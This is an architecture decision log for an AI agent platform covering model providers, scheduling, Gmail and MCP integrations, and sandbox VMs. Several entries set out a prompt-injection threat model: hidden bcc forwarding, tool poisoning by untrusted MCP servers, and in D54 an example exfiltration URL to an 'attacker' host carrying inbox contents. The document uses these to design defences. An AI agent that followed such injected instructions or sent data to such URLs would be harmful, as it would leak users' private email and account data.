# 9. Decisions

A log of technical decisions. Add new ones at the bottom; don't delete old ones — mark them **Superseded** and link to the replacement.

| # | Decision | Status | Why |
|---|---|---|---|
| D1 | **Next.js 16 App Router** for UI and API | Decided | One codebase for pages, API routes and server actions. Note: Next 16 has breaking changes vs older tutorials — check `node_modules/next/dist/docs/` |
| D2 | **NextAuth v4 with JWT sessions**; GitHub sign-in (Google configured but no keys yet) | Decided | Came with the starter. Users are upserted into `users` on sign-in. Auth config lives in `lib/auth.ts` because route files may only export HTTP handlers |
| D3 | **Neon Postgres + Drizzle ORM** | Decided | Serverless Postgres, typed queries. Separate Neon project from the user's other apps |
| D4 | ~~**Google Gemini** (`@google/genai`) for agents, via the Gemini Developer API with an AI Studio key~~ | Superseded by D26 | Dropped after one day in use: on the free tier the full `flash` models all returned 503 and Google Search grounding had no quota at all, so neither the model nor the search tool we had designed around was actually reachable |
| D5 | **Inngest** for schedules, events and long-running runs | Decided | Already in the project; durable steps, retries, cron, wait-for-event (needed for approvals) |
| D6 | **DiceBear `clay` avatars** stored as a seed per agent | Decided | No image storage needed; same seed always gives the same avatar |
| D7 | ~~**Chat streams plain text** from the API route~~; only the model's own words are saved to history (error notes are not) | Stream format superseded by D23; the history rule still stands | Keeps history clean for the model |
| D8 | `drizzle-kit push` during early development | Decided (temporary) | Fast iteration. Replace with generated migrations before launch (see [data model](03-data-model.md#migrations)) |
| D9 | **One agent runner** shared by chat and background tasks | Decided, built (`lib/agent/runner.ts`) | Same behaviour everywhere; one place for limits and logging |
| D10 | **Approval required by default** for write/destructive tools | Proposed | Main defence against prompt injection ([security](07-security.md)) |
| D11 | ~~Hybrid integrations: Gmail in-house, integration platform for breadth, MCP later~~ | Superseded by D17 | — |
| D12 | **Sandbox provider** for per-agent VMs; agent loop stays on our server, only sandbox tools run in the VM | Decided (provider: D15) | Avoid running our own VM fleet; keep secrets out of VMs ([VMs](06-virtual-machines.md)) |
| D13 | **Encrypt OAuth tokens** at rest (AES-256-GCM, key from env → KMS later) | Decided, built (`lib/crypto.ts`) | Tokens grant full access to users' accounts, so the database alone must not be enough to read one. Ciphertexts are bound to their owner and provider as AAD, which also stops a token blob being moved between rows, and carry a `v1:` prefix so the algorithm can change later |
| D14 | **Individual users only** — agents and connections belong to a user; no team workspaces | Decided | Simpler data model and permissions. Teams can come later with a migration |
| D15 | **E2B** for per-agent sandboxes (dedicated VM feature) | Decided | Built for AI agents; fast start, pause/resume with persistent disk, TypeScript SDK |
| D16 | **Vercel** for hosting | Decided | Natural fit for Next.js; works with Inngest. Consequence: no long-running processes in our functions — background work goes through Inngest, local (stdio) MCP servers run inside E2B, not on Vercel |
| D17 | **MCP-first integrations**: Gmail built in-house; other apps via allow-listed **remote MCP servers** with per-user OAuth; fallback (own code or an integration platform) only for apps without a good MCP server | Confirmed by D46 | Open standard, many official remote servers, one client in our runner covers many apps ([integrations](05-integrations.md)). Verified at the start of Phase 5 and confirmed as **D46** |
| D18 | **Sign in with GitHub *and* Google** | Decided | Most non-developer users expect Google; both providers are already wired in `lib/auth.ts` and shown on the sign-in page. Needs `GOOGLE_CLIENT_ID` / `GOOGLE_CLIENT_SECRET`. Separate from the Gmail *connection* OAuth in Phase 3 ([integrations](05-integrations.md)) |
| D19 | **Markdown replies** with `react-markdown` + `remark-gfm`; only a fixed set of tags is rendered, no raw HTML; fenced code uses the existing `shiki` code block | Decided | Agents answer with lists, tables and code. Allowing raw HTML in model output would be an injection risk ([security](07-security.md)), and the shiki setup already highlights code as it streams |
| D20 | **One conversation per URL**: `/workspace/agent/:id?c=<conversation id>`; no `c` opens the most recent chat | Decided | Chats are shareable and survive a refresh. A brand-new chat updates the URL with `history.replaceState` so the reply keeps streaming |
| D21 | **Agent editing lives on its own page** (`agent/[id]/settings`) rather than in a dialog | Decided | Room for the per-agent Tools (Phase 3) and Tasks (Phase 4) settings to come |
| D22 | ~~**`web.search` is Gemini's own Google Search grounding**~~ | Superseded by D27 | The idea survives — search runs provider-side and we log it — only the provider changed |
| D23 | **Chat streams newline-delimited JSON events** (`text`, `activity`, `note`) instead of plain text | Decided | A turn is no longer only words: the UI has to show which tools ran while they run. One JSON object per line keeps it readable and needs no SSE framing. Supersedes the stream format in D7; `lib/agent/events.ts` holds the types for both sides |
| D24 | **Tool activity is shown live but not saved**; reopening a past chat shows the reply alone | Decided | The reply is the lasting artefact; the steps live in `run_steps` and will get a proper timeline in the Runs tab (Phase 4) rather than being replayed inline |
| D25 | **A native tool that the provider refuses is dropped, not fatal**: a refusal retries the turn without native tools. A **capability** refusal (400/403/404) blocks native tools for every later run on that server instance; a **rate limit** (429) drops them for the current run only. 402 (out of credits) is not handled this way | Decided | Found on the first live test: the free tier has no Google Search grounding quota, and because grounding travels in the same request as our function declarations, the refusal killed every message — including ones that only needed `time.now`. An optional tool being unavailable must not take the agent down with it. A capability block lasts **until the server instance restarts** — upgrading the account does not lift it on its own. The user is told only in the run where the refusal happened; later runs simply answer without search and say nothing |
| D26 | **OpenRouter** as the model provider, called with the **OpenAI SDK** (`openai`) pointed at `https://openrouter.ai/api/v1`; default model `deepseek/deepseek-chat-v3.1` | Decided | Replaces D4. One key reaches 478 models (415 with tool calling), so a model that is unavailable, too slow or too expensive is a one-line change in `lib/ai.ts` rather than a rewrite — the exact problem that killed D4. OpenRouter is wire-compatible with the OpenAI API, so the official SDK is the client and `@google/genai` is gone. DeepSeek v3.1 is $0.25/$0.95 per 1M tokens, about a third of Gemini 3.8 Flash's price on the same platform |
| D27 | **`web.search` is OpenRouter's `openrouter:web_search` server tool** | Decided | Replaces D22 and keeps its shape: the model decides when to search, OpenRouter runs it mid-request and feeds the results back, and we log what it cited. Two improvements over grounding — it works with **any** tool-calling model, so it survives a change of `CHAT_MODEL`, and it is declared per request rather than being a property of the model. Billed per search on top of tokens. We learn what it did from `url_citation` annotations and `usage.server_tool_use_details`, which is less than Gemini gave us (no query text), so the chat shows the hosts cited instead of the queries run |
| D28 | **Our own `web.fetch` is kept** rather than OpenRouter's `openrouter:web_fetch` server tool | Decided | It is already built, tested and free, it keeps the SSRF guard on our side ([security](07-security.md#fetching-urls-the-model-chose)), and the fetched text lands in our own `run_steps`. OpenRouter's version is the better choice later if JS-heavy pages or PDFs start mattering |
| D29 | **`write` tools may have approval turned off per tool; `destructive` may not** | Decided | Answers the open question that gated Phase 3. Approval-by-default is the main defence against prompt injection (D10), but requiring a click for every draft an agent writes would make it unusable — so a user can trust a specific `write` tool on a specific agent. `destructive` stays locked whatever the setting, because the blast radius is permanent and an agent reading strangers' email is exactly what an attacker aims at. `gmail.send` is `write`, so it *can* be trusted deliberately; a future delete tool could not |
| D30 | **One turn at a time per conversation**, enforced with a lease column `conversations.busy_until`: a turn claims the conversation with one conditional `UPDATE` (free, or lease expired) before saving the user's message, and releases it when the turn ends — success, failure or cancellation. A second message meanwhile gets **409** | Decided | Two overlapping messages (two tabs, a double send) would each generate from history missing the other's turn. There was no existing lock to reuse; a Postgres advisory lock would have to be held across the whole streamed reply, which doesn't hold up through Neon's pooled connections. The 10-minute expiry only matters if a server dies mid-turn |
| D31 | **`web.fetch` connects only to addresses it has checked**: requests go through an `undici` Agent whose DNS `lookup` refuses private addresses, so the check and the connection use the same answer | Decided | Checking the hostname and then letting `fetch` resolve it again left a window for DNS rebinding. `undici` was already installed (through `openai`) and is now a direct dependency |
| D32 | **Default model is `nvidia/nemotron-3-ultra-550b-a55b:free` while testing** (was `deepseek/deepseek-chat-v3.1`, D26) | Decided (temporary) | Lets the agent be tested with no credit on the account. `google/gemma-4-31b-it:free` was tried first, but its free provider answered 429 on every request (19 Nov 2026); Nemotron Ultra called the `time_now` tool correctly in about a second at $0. It is one of 15 free OpenRouter models with tool calling. Trade-offs: tight rate limits (one agent turn can use several requests), free providers may log prompts, and multi-step tool use is unproven on it. `web.search` is still billed per search, so it needs credit even with a free model. Switch back to a paid model before agents read real email (Phase 3) |
| D33 | **All timestamps are `timestamptz`** (`withTimezone: true` in Drizzle) | Decided | Plain `timestamp` has no zone, and the `postgres` driver reads it back in the server's local zone, so on a machine in India every time came back 5.5 hours early (e.g. "5 hours ago" for a chat just used). Existing columns were converted with `USING … AT TIME ZONE 'UTC'`, because the stored values were already UTC, so no time moved |
| D34 | **Default model back to `deepseek/deepseek-chat-v3.1`** (was `nvidia/nemotron-3-ultra-550b-a55b:free`, D32) | Decided, then reversed by D38 — **not in force** | D32 was explicitly temporary: free for testing, switch before agents read real email. Phase 3 is that point. Free providers may log prompts, and the free tiers' rate limits are hostile to a loop that makes several requests per turn — neither is acceptable once the thing in the context window is somebody's inbox. Answers the open question "which model is the default"; per-agent choice is still deferred, so `lib/ai.ts` remains the one place it is set |
| D35 | **A chat approval pauses the run and resumes in a second request.** The paused turn's model conversation is stored on the `approvals` row; approving executes the **stored payload** and continues from the stored conversation. At most **one** approval per model turn — later calls in the same turn are answered "not run" and the model may ask again | Decided, built (`lib/agent/approvals.ts`, `resumeAgent` in `lib/agent/runner.ts`) | A chat turn is a single HTTP request and cannot sit waiting for a click, and Phase 4's durable `waitForEvent` doesn't exist yet. Storing the conversation is what makes the agent able to say "Sent." afterwards rather than just stopping. Executing the stored arguments — not a regenerated call — is the security property: what runs is what the card showed, even if the mailbox has changed in between. One card at a time keeps "Approve" unambiguous; two pending sends in one turn would be a question the UI can't ask clearly. The copy of the conversation is deleted as soon as the decision is acted on, because it holds whatever email the agent had read |
| D36 | **Gmail uses the same Google OAuth client as sign-in by default**, with `GMAIL_CLIENT_ID` / `GMAIL_CLIENT_SECRET` to split them later | Decided | One fewer thing to configure to get Phase 3 working: both redirect URIs go on the client that already exists. It should be split before verification, because a restricted-scope review against the shared client could hold up sign-in for everyone ([security](07-security.md#google-verification)) |
| D37 | **No `bcc` on the Gmail write tools** | Decided | An approval card is only a defence if it shows every recipient, and a blind copy is by definition one the reviewer doesn't see — a quiet way to forward a mailbox elsewhere, which is exactly what a prompt injection would reach for. `to` and `cc` both appear on the card. If a real use turns up, it has to be visible there first |
| D38 | **Default model back to the free `nvidia/nemotron-3-ultra-550b-a55b:free`** (reverses D34 for now) | Decided (temporary) | The OpenRouter account has no credit, so the paid model answered 402 to every message. Accepted risk, chosen by the user: while this is in place, email an agent reads goes to a free provider that may log prompts. Return to `deepseek/deepseek-chat-v3.1` (D34) as soon as there is credit |
| D39 | **The model is set in `.env` (`OPENROUTER_MODEL`)**, falling back to `DEFAULT_MODEL` in `lib/ai.ts` when empty | Decided | The model had changed four times in two days (D26, D32, D34, D38), each time a code edit and a commit. It is configuration, not code: one line in `.env` plus a restart. An id that isn't shaped like `provider/model` is ignored with a warning rather than sent to OpenRouter. A per-agent model setting is still planned |
| D40 | **One Inngest cron ticks every minute and fans out the tasks that are due**, each claimed with a conditional `UPDATE` on `tasks.next_run_at`; the per-task cron is parsed in the user's own timezone by `lib/schedule/cron.ts` | Decided, built | Inngest supports `TZ=Europe/London 0 9 * * *`, but a function's cron is part of its *definition* and ours is a row a user edits — a per-task Inngest cron would mean creating functions at runtime. So the clock is fixed and the arithmetic is ours: the scheduler's only query is "enabled tasks whose `next_run_at` has passed", and the claim advances that column so two ticks, or two servers, cannot run the same due time twice. The next time is always computed from **now**, so a server that was down for a day runs each task once rather than catching up on 24 missed runs. Timezone, not UTC, because "every weekday at 9:00" has to mean 9:00 where the user is, in winter and in summer — including the hour that doesn't exist when the clocks go forward |
| D41 | **A background run is durable step by step**, through a `Durability` adapter the runner takes (`lib/agent/durability.ts`): chat runs each piece immediately, a task run wraps each model call, tool call and decision in `step.run`. A background approval **waits** on `step.waitForEvent("approval/decided", { timeout: "24h" })` and carries on in the same run | Decided, built | Keeps D9 — one runner, same behaviour everywhere — while giving background runs what chat can't have. Per-step durability means a failed tool call is retried on its own and a worker that dies mid-run resumes rather than re-reading a mailbox and re-sending an email. It also forced two small changes worth naming: a step's result has to survive JSON, so a tool call returns the tool's **key** rather than the tool, and the step log numbers itself from the database rather than from a counter in memory, which would reset on every replay. The approval wait is the real prize: in chat, an approval ends the request and a second one resumes it (D35), which a scheduled run has no way to do. Waiting durably means "approve" is followed by the agent actually finishing the job. If the decision event is ever lost, the 24-hour timeout reads the row before giving up, so a recorded decision is still honoured |
| D42 | **In-app delivery is a `notifications` table and an Inbox page**; no realtime, no polling — the page is server-rendered and the sidebar shows the unread count | Decided, built | A task run finishes when nobody is looking, so the result needs somewhere to land that outlives the run. A row per delivered result is also what makes an approval from a background run reachable: the card is drawn in the inbox from the `approvals` row it points at. Realtime would be nice and is not needed to be useful — the common case is reading this morning's summary this morning. Push notifications stay in "Later" |
| D43 | **Run contents are kept for 30 days, notifications for 90**, swept nightly by an Inngest cron: a step's `payload` is replaced with `{"purged": true}` and the row is kept | Decided, built | Answers the open question that was gated on Phase 4. A step payload is the email the agent read and the page it fetched; keeping that for ever is a liability with no use, because debugging a run from six weeks ago needs to know *which* tools ran and whether they worked, not what was in them. So the audit log keeps its shape for ever and loses its contents on a timer, and the run page says so where a payload has been cleared rather than looking empty |
| D44 | **Email delivery is Resend over HTTPS with no SDK** (`RESEND_API_KEY`, `EMAIL_FROM`); a channel that can't deliver falls back to the in-app inbox | Decided, built | One `POST` is the whole integration, so a dependency would be bigger than the code it replaced, and the provider is swappable in one file. Two properties matter more than the provider: this sends *as Omnix to its own user*, never as the user (that is `gmail.send`, which needs a connection and a card), so it is deliberately not reachable as a tool; and the body is an agent's words, which may quote a stranger's email, so the HTML part is escaped from the text rather than built from the content. With the key unset, email silently becoming nothing would be the worst outcome, so the result goes to the inbox instead and the task says why |
| D45 | **Three caps on unattended work**: a schedule may run a task at most 4 times an hour, an agent may have 20 tasks, and a user may make 50 background runs in 24 hours — past which runs are skipped with a note in their inbox | Decided, built | `* * * * *` is a valid cron and a way to spend a month's budget in a day. The monthly OpenRouter budget is still an open question, and "decide it before agents run unattended" cannot mean "run unattended with no limit in the meantime" — so these are the backstop until it is decided. The daily cap counts background runs only: a chat run has somebody sitting in front of it, and stopping those would break the app rather than protect the budget |
| D46 | **MCP-first integrations confirmed** (D17 was Proposed): Slack, Notion and Atlassian all run official remote MCP servers over Streamable HTTP with OAuth 2.1, so Slack, Notion and Jira arrive as MCP servers rather than as hand-written integrations | Decided | The spike (22 Nov 2026, [integrations](05-integrations.md#the-phase-5-spike-22-november-2026)) probed all three: each answers an unauthenticated `tools/list` with a `401` and an RFC 9728 `resource_metadata` challenge, each publishes authorization server metadata with PKCE S256 and a `refresh_token` grant. One client in our runner therefore reaches all three, which is the whole premise of D17. The fallback (own code, or an integration platform) stays unused and undecided because none of the three needs it |
| D47 | **The MCP client is the official v2 TypeScript SDK** (`@modelcontextprotocol/client`), with `versionNegotiation: { mode: "auto" }` so each server's protocol era is detected at connect time | Decided | The opposite of the Gmail call, where four endpoints didn't justify a dependency (D13 era reasoning in [integrations](05-integrations.md#gmail--built-phase-3)). MCP is no longer a thin wire: revision 2026-07-28 is stateless with a `_meta` envelope on every request and a `server/discover` advertisement, while 2025-era servers open with `initialize` and carry `Mcp-Session-Id` — and Atlassian is still on the old shape while Notion and Slack are not. Writing *both* eras, plus OAuth discovery, dynamic registration, PKCE, RFC 9207 `iss` validation, RFC 8707 resource indicators and SSE framing, is a protocol implementation, not an integration. The SDK is official, is the stable v2 line, and `mode: "auto"` makes the era a connection property instead of a per-server special case |
| D48 | **The allow-list carries a per-server registration mode**: `dynamic` servers are registered on first use through DCR and the registration is stored per issuer and shared by every user; `preregistered` servers read a client id and secret from the environment | Decided | Notion and Atlassian both offer dynamic client registration, so connecting them needs no configuration at all — the server issues us a `client_id` and the user just signs in. Slack refuses: it has no `registration_endpoint`, and only a Marketplace-published or workspace-internal app may use its MCP server at all, with admin approval. One mode for both would mean either giving up zero-config for Notion and Jira, or pretending Slack can be connected when it can't, so the mode is a property of the server. A DCR registration identifies *Omnix*, not a user, which is why it is keyed by issuer and shared; the tokens it goes on to mint are per user and encrypted like any other connection (D13) |
| D49 | **Only allow-listed MCP servers** — a user cannot paste their own server URL | Decided | Answers the open question that Phase 5 gated. A tool's description is instructions the model will read and act on, so an arbitrary server is an arbitrary prompt injection with credentials attached ("tool poisoning"), and the approval-by-default rule (D10) is weaker than it looks when the server also writes the summary the user reads. An allow-list is also what makes a reviewed read-only list possible at all: marking a tool safe is a judgement about a specific server we have looked at. Users adding their own URLs stays in "Later" ([roadmap](08-roadmap.md#later)), where it needs a trust model of its own rather than a text field |
| D50 | **One E2B *desktop* sandbox per agent** (`@e2b/desktop`), tracked in `sandboxes` (one row per agent); a VM pauses itself after **10 idle minutes** (`lifecycle.onTimeout: "pause"`), and deleting an agent kills its VM first | Decided, built (`lib/sandbox`) | The desktop template is what makes the live screen in the run panel possible (a VNC stream URL), at the cost of more memory than a plain code sandbox. Auto-pause keeps an idle VM from costing compute; E2B keeps a paused VM until it is killed, so the delete has to kill it or it stays for good. Status changes are claimed with a conditional update, so two clicks cannot start two VMs. Verify with `npm run verify:vm -- --live` |
| D51 | **VM addresses accept public traffic** (`network.allowPublicTraffic: true` on create) | Decided (chosen by the user) | The live screen is an E2B VNC page in an iframe, and the account default (`allowPublicTraffic: false`) answers 403 unless the request carries an `e2b-traffic-access-token` header, which an iframe cannot send (checked live: 403 without, 200 with). What protects the screen: a fresh VNC password on every open (`openSandboxScreen`), an unguessable sandbox id in every address, and no secrets ever in the VM (D12). The accepted cost: any other web server a program in the VM starts is reachable by anyone who learns its address. Alternatives weighed: private VMs with periodic screenshots through our server, or a per-agent switch |
| D52 | **Agent VM tools**: `sandbox.run_code` (python, bash), `sandbox.write_file`, `sandbox.read_file`, `sandbox.list_files`, `sandbox.open_browser`. All **off by default** (even the reading ones: using any starts a paid VM), offered only when `E2B_API_KEY` is set; running code and writing files are `write` risk, so they ask unless trusted on that agent (D29); paths stay under `/home/user`; output is marked untrusted. The first call starts or resumes the VM | Decided, built (`lib/tools/sandbox.ts`) | Code in the VM can reach the internet, which is a way out for anything the agent has read, so the user sees the code on the approval card before it runs. No Node: it is not in E2B's desktop image (checked live), and installing it per VM would slow every first run. VM tools get their own time limit (`ToolDefinition.timeoutMs`), because starting the VM alone takes about 10 s. Verified with `npm run verify:vm -- --live` (42 checks) |
| D53 | **The Isolated VM is one setting per agent**, and **the app tells the agent how to use it**: the Settings switch turns all VM tools on or off together, with one choice, "Run code without asking" (`setAgentVm`); when VM tools are on, the system prompt gains a "Your VM" section (what persists, use code for exact work, a folder per scheduled task at `/home/user/tasks/<name>-<id>`, report only what's new and update the memory only after delivery, hand files over with share_file); a scheduled task whose agent would stop for approval shows a warning with a one-click fix | Decided, built (`components/custom/workspace/VmSetting.tsx`, `lib/ai.ts`) | A user writes "find me React jobs every morning", not a procedure, and won't find six separate tool switches. The rules in the prompt are what made Job Searcher's hand-written task work, generalised. "Ask before writing" no longer touches VM tools, which have their own switch. Design: `design/reference/22-vm-setting-and-task-warning.html` |
| D54 | **Exfiltration guard**: an agent with any tool that reads a connected account (Gmail, Notion, Jira…) asks before every way out to the internet: `web.fetch` and `sandbox.open_browser` unless the URL is one the user wrote themselves (exact match), and `sandbox.run_code` always, overriding "Run code without asking" | Decided, built (`lib/agent/egress.ts`) | Prompt injection could make an agent fetch `https://attacker/?d=<inbox>`; `web.fetch` is a read tool and never asked, and VM code can reach the internet. Decided per agent, not per run, because private data can return in a later run through VM files or chat history. Not covered: `web.search` (runs at the search provider, whose logs an attacker can't read). Verify with `npm run verify:egress` |
| D55 | **Rate limits and a monthly VM time cap.** Per user: 10 chat messages a minute and 300 a day, 20 approval decisions a minute, 20 VM actions (start, stop, delete, open screen) a minute, 5 Run-now presses a minute; fixed windows counted in Postgres (`rate_limits`, one upsert per request), so they hold across server instances. VM time: each running stretch is recorded in `vm_usage`; at the plan's monthly allowance (Free 30 min) starting a VM or a VM tool call is refused, E2B's own timer is set to stop a VM exactly at the cap, and the 10-minute sweep stops any that slipped through. Files are always kept | Decided, built (`lib/rate-limit.ts`, `lib/vm-usage.ts`) | VM time is the most expensive resource and was unbounded; a script or leaked session could run up OpenRouter and E2B bills. Which plan a user is on is still mock (`MOCK_CURRENT_PLAN_ID`). Verify with `npm run verify:limits -- --live` |
